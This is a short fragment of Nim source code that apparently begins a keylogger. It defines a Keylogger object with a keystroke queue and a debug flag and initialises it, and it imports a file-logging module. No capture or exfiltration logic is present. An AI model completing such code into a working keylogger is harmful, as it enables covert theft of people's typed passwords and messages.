
import fileLogger

type
  Keylogger = ref object
    letterQueue: string
    debug: bool

proc initKeylogger(): Keylogger =
  result = Keylogger(debug: true)

  result.letterQueue = ""


